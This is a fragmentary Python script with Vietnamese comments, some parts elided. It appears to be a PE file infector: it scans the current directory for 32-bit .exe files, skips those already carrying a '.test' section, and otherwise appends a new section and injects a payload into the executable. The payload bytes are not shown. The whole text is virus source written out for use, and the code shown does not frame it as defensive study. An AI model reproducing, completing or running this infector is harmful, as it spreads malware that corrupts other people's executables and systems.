...
def createNewSection(pe):
	# lấy section nằm ở cuối
	lastSection = pe.sections[-1]
	# tạo 1 section mới theo cấu trúc Section của file PE muốn lây nhiễm
	newSection = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
	# gán dữ liệu của section mới tạo này mặc định bằng NULL hết
...
if __name__ == '__main__':
	# lấy đường dẫn tuyệt đối thư mục hiện tại
	current_dir = getcwd()
	# lấy tên từng file có đuôi .exe trong thư mục hiện tại
	...
	for file in files_name:
		...
		# nếu header của PE file thuộc hex x8664, ta thực hiện thông báo xác định đây là file 64-bit và không thể lây nhiễm được
		if pe.FILE_HEADER.Machine == 0x8664:
			print(file + " is 64-bit => can't be infected")
		# nếu section nằm ở cuối là .test, ta sẽ hiện ra thông báo là file này đã có section .test rồi, không cần lây nhiễm nữa
		elif lastSectionName == ".test":
			print(file + " have " + lastSectionName + " section => no need to infect")
		else:
		# nếu không phải 2 trường hợp trên, tiến hành gọi hàm chèn payload ở trên vào file này.
